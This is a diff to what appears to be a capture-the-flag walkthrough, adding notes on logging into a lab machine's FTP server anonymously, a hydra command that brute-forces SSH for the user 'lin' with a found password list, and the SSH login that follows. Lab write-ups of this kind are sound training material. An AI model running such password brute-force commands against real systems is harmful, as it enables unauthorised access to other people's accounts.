@@ -9,22 +9,22 @@ A. 21, 22, 80
 
 Who wrote the task list? 
 
-It sounds like we are looking for a file of some sorts.  A good place to start would be FTP. From the command line I logged into their FTP server as **anonymous** and had a look around.
+It sounds like we are looking for a file of some sorts.  A good place to start would be FTP. From the command line I logged into their FTP server as **anonymous** and had a look around. I found 2 files of interest which could provide details to use hydra.
 
 
-    ~#ftp [ip address] 21
+     ~#ftp [ip address] 21
  
 A. lin
 
 What service can you bruteforce with the text file found?
 
-
+        ~# hydra -l lin -P locks.txt ssh://10.10.123.67
 
 
 
 What is the users password? 
 
-
+        ~# ssh lin@10.10.123.67
 
 
 user.txt
